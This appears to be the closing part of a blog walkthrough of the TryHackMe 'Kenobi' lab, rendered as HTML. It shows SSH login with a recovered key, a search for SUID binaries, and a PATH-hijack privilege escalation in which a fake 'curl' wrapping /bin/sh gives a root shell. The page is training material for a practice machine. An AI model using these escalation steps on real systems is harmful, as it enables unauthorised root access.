+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa kenobi@10.10.48.208</span></span></code></pre></div><p><a href="#R-image-70be6ee34e3e06c1819f73f1ba97a5af" class="lightbox-link"><img src="/walkthroughs/kenobi/task3_login.png" alt="SSHLogIn" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-70be6ee34e3e06c1819f73f1ba97a5af"><img src="/walkthroughs/kenobi/task3_login.png" alt="SSHLogIn" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once logged in you can cat the user flag.</p>
+<blockquote>
+<p>What is Kenobi&rsquo;s user flag (/home/kenobi/user.txt)?</p>
+</blockquote>
+<blockquote>
+<p>Answer: user.txt&rsquo;s value.</p>
+</blockquote>
+<h2 id="task-4-privilege-escalation-with-path-variable-manipulation">Task 4: Privilege Escalation with Path Variable Manipulation</h2>
+<p>SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.</p>
+<p>To search the a system for these type of files run the following: <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><a href="#R-image-986705e7e5dbbc9fb3f9e609519d2b62" class="lightbox-link"><img src="/walkthroughs/kenobi/task4_files.png" alt="findperms" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-986705e7e5dbbc9fb3f9e609519d2b62"><img src="/walkthroughs/kenobi/task4_files.png" alt="findperms" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>What file looks particularly out of the ordinary?</p>
+</blockquote>
+<blockquote>
+<p>Answer: /usr/bin/menu</p>
+</blockquote>
+<blockquote>
+<p>Run the binary, how many options appear?</p>
+</blockquote>
+<blockquote>
+<p>Answer: 3</p>
+</blockquote>
+<p><a href="#R-image-90fcbf7ea1a89e11958b67d77723f336" class="lightbox-link"><img src="/walkthroughs/kenobi/task4_binary.png" alt="Binary" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-90fcbf7ea1a89e11958b67d77723f336"><img src="/walkthroughs/kenobi/task4_binary.png" alt="Binary" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>The next step is not necessary for this machine, but I like to stay in practice by looking through everything I come across. So I ran the binary three times and selected each option to see what happened or if we could enumerate any additional information from them.</p>
+<p>You do see that they are running with out using the full path of /usr/bin/curl, /usr/bin/uname, and /usr/bin/ifconfig.</p>
+<p>Knowing this will allow me to manipulate my path to elevate my privileges. First I cd into my tmp directory. Then I echo the path of a bash shell to my curl command, set it&rsquo;s privileges, and set my path. Now I can run the binary to elevate to root.</p>
+<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kenobi@kenobi:~$ cd /tmp
+</span></span><span style="display:flex;"><span>kenobi@kenobi:/tmp$ echo /bin/sh &gt; curl
+</span></span><span style="display:flex;"><span>kenobi@kenobi:/tmp$ chmod <span style="color:#ae81ff">777</span> curl
+</span></span><span style="display:flex;"><span>kenobi@kenobi:/tmp$ export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span><span style="display:flex;"><span>kenobi@kenobi:/tmp$ /usr/bin/menu</span></span></code></pre></div><p><a href="#R-image-24740a82c8501229767e50db50758e1b" class="lightbox-link"><img src="/walkthroughs/kenobi/root.png" alt="root" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-24740a82c8501229767e50db50758e1b"><img src="/walkthroughs/kenobi/root.png" alt="root" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<blockquote>
+<p>We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the &ldquo;curl&rdquo; binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed.</p>
+</blockquote>
+<p>All thats left is to cat your root flag at /root/root.txt.</p>
+<blockquote>
+<p>What is the root flag (/root/root.txt)?</p>
+</blockquote>
+<blockquote>
+<p>Answer: root.txt&rsquo;s value</p>
+</blockquote>
+<p>And that&rsquo;s root! Happy Hacking!</p>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<a href="/index.html">
+    <img src="/images/logo.png" 
+        width="200"
+        height="120"
+        alt="Website logo of hacker cat"/>
+    <h2 style="padding:0; margin:0;">H1roBytes</h2>
+</a>
+        </div>
+        <div class="searchbox default-animation">
+          <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
+          <label class="a11y-only" for="R-search-by">Search</label>
+          <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+          <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+        </div>
+        <script>
+          var contentLangs=['en'];
+        </script>
+        <script src="/js/auto-complete.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1738202701" defer></script>
+        <script src="/js/search.js?1738202701" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/index.html" class="parent "><input type="checkbox" id="R-section-a25630664138ae6b33064dc3d9c0b30e" aria-controls="R-subsections-a25630664138ae6b33064dc3d9c0b30e" checked><label for="R-section-a25630664138ae6b33064dc3d9c0b30e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Walkthroughs</span></label><a class="padding" href="/walkthroughs/index.html">Walkthroughs</a><ul id="R-subsections-a25630664138ae6b33064dc3d9c0b30e" class="morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/2023-advent-of-cyber/index.html" class=""><a class="padding" href="/walkthroughs/2023-advent-of-cyber/index.html">Advent of Cyber 2023! - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/cozyhosting/index.html" class=""><a class="padding" href="/walkthroughs/cozyhosting/index.html">Cozy Hosting - Hack The Box</a></li>
+          <li data-nav-id="/walkthroughs/kenobi/index.html" class="active"><a class="padding" href="/walkthroughs/kenobi/index.html">Kenobi - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/nibbles/index.html" class=""><a class="padding" href="/walkthroughs/nibbles/index.html">Nibbles - HTB</a></li>
+          <li data-nav-id="/walkthroughs/red-team-engagements/index.html" class=""><a class="padding" href="/walkthroughs/red-team-engagements/index.html">Red Team Engagements - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/red-team-fundamentals/index.html" class=""><a class="padding" href="/walkthroughs/red-team-fundamentals/index.html">Red Team Fundamentals - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/rootme/index.html" class=""><a class="padding" href="/walkthroughs/rootme/index.html">RootMe - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/steel-mountain/index.html" class=""><a class="padding" href="/walkthroughs/steel-mountain/index.html">Steel Mountain - TryHackMe</a></li></ul></li>
+          <li data-nav-id="/resources/index.html" class=""><input type="checkbox" id="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24" aria-controls="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24"><label for="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Resources</span></label><a class="padding" href="/resources/index.html">Resources</a><ul id="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24" class="morespace collapsible-menu">
+          <li data-nav-id="/resources/active-directory-enumeration/index.html" class=""><a class="padding" href="/resources/active-directory-enumeration/index.html">Active Directory Enumeration</a></li></ul></li>
+          <li data-nav-id="/contact/index.html" class=""><a class="padding" href="/contact/index.html">Contact</a></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks showVariantSwitch">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-language fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = baseUri + this.value;">
+                      <option id="R-en" value="/walkthroughs/kenobi/index.html" lang="en" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch showVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-paint-brush fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-relearn-dark" value="relearn-dark" selected>Relearn Dark</option>
+                      <option id="R-zen-dark" value="zen-dark">Zen Dark</option>
+                      <option id="R-relearn-bright" value="relearn-bright">Relearn Bright</option>
+                      <option id="R-relearn-light" value="relearn-light">Relearn Light</option>
+                      <option id="R-zen-light" value="zen-light">Zen Light</option>
+                      <option id="R-neon" value="neon">Neon</option>
+                      <option id="R-learn" value="learn">Learn</option>
+                      <option id="R-blue" value="blue">Blue</option>
+                      <option id="R-green" value="green">Green</option>
+                      <option id="R-red" value="red">Red</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fas fa-history fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter">
+	    <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
+		<p><a href="https://hirobytes.xyz/disclaimer">Disclaimer</a></p>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1738202701" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1738202701" defer></script>
+    <script>
+      function useMathJax( config ){
+        if( !Object.assign ){
+          
+          return;
+        }
+        window.MathJax = Object.assign( window.MathJax || {}, {
+          loader: {
+            load: ['[tex]/mhchem']
+          },
+          startup: {
+            elements: [
+              '.math'
+            ]
+          },
+          tex: {
+            inlineMath: [
+              ['$', '$'], 
+              ['\\(', '\\)']
+            ]
+          },
+          options: {
+            enableMenu: false 
+          }
+        }, config );
+      }
+      useMathJax( JSON.parse( null ) );
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <script src="/js/d3/d3-color.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1738202701" defer></script>
+    <script src="/js/js-yaml.min.js?1738202701" defer></script>
+    <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse( null );
+    </script>
+    <script>window.noZensmooth = true;</script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
+    <script>
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1738202701  };
+    </script>
+    <script src="/js/theme.js?1738202701" defer></script>
+  </body>
+</html>
